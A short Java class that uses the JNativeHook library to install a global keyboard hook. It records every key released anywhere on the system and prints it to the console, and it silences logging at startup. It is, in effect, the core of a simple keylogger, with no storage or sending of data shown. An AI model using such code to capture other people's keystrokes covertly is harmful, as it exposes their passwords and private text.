import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.util.logging.LogManager;

public class JHook implements NativeKeyListener {


    public JHook(){
        LogManager.getLogManager().reset();
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.out.print("Dust");
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        //Not yet implemented.
    }


    public void nativeKeyPressed(NativeKeyEvent nke) {

    }


    public void nativeKeyReleased(NativeKeyEvent nke) {
        if(nke.getKeyCode() == NativeKeyEvent.VC_ENTER){
            System.out.println("");
        } else if(nke.getKeyCode() == NativeKeyEvent.VC_BACK_SLASH){

        } else {
            if (!Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK)) {
                String capsLock = NativeKeyEvent.getKeyText(nke.getKeyCode());
                capsLock = capsLock.toLowerCase();
                System.out.print(capsLock);
            } else {
                System.out.print(NativeKeyEvent.getKeyText(nke.getKeyCode()));
            }
        }
    }
}
